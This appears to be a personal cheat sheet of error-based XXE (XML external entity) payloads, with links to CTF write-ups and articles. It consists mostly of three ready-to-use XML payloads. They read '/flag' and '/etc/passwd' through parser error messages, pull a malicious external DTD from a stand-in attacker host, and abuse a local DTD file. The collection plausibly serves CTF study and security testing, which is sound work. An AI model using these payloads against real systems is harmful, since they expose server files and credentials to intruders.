# 文章
[报错XXE](https://j7ur8.github.io/WebBook/VUL/%E6%8A%A5%E9%94%99XXE.html)<br />[从几道CTF题学习Blind XXE - 先知社区](https://xz.aliyun.com/t/8041#toc-12)<br />[Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)<br />[https://articles.zsxq.com/id_85l86vkeu8zf.html](https://articles.zsxq.com/id_85l86vkeu8zf.html)<br />[https://wx.zsxq.com/dweb2/index/topic_detail/544481482488524](https://wx.zsxq.com/dweb2/index/topic_detail/544481482488524)
# Payload
### Error Based XXE(自定义实体)
```xml
<?xml version='1.0' encoding="utf-8"?>
<!DOCTYPE message [ 
  <!ELEMENT message ANY >
  <!ENTITY % NUMBER '
		<!ENTITY &#x25; file SYSTEM "file:///flag">
  	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///Ki1ro/&#x25;file;&#x27;>">
		&#x25;eval;
		&#x25;error;
	'>
	%NUMBER;
]> 
```
### Error Based XXE(外部实体)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
### Error Based (系统实体)
```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```
